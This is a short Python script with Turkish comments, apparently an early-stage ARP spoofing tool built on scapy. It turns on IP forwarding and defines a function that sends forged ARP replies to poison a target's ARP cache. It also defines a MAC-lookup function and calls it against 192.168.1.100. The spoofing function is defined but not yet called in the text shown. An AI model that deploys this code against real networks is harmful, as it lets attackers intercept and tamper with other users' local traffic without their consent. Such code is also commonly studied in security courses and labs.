import os
import scapy.all as scapy
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

"""
Bunu düzene sokmamız gerekiyor ondan dolayı fonksiyon içerisine alıyoruz.
arp_paketi = scapy.ARP(op=2, pdst="192.168.1.100", psrc="10.0.2.6")
"""

def Paketleme(ip1,ip2):
    arp_paketi = scapy.ARP(op=2, pdst=ip1, psrc=ip2)
    scapy.send(arp_paketi, verbose=True)

# Şu anlık listelemeye ihtiyacımız yok.
# scapy.ls(scapy.ARP())

#MAC Adresine ulaşmak
def Tarayici(ip):
    res_packet = scapy.ARP(pdst=ip)
    view_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    fake_packet = view_packet / res_packet
    packet = scapy.srp(fake_packet, timeout=2, verbose=False)[0]

    if len(packet) == 0:
        print("MAC bulunamadı")
    else:
        print(packet[0][1].hwsrc)

Tarayici("192.168.1.100")

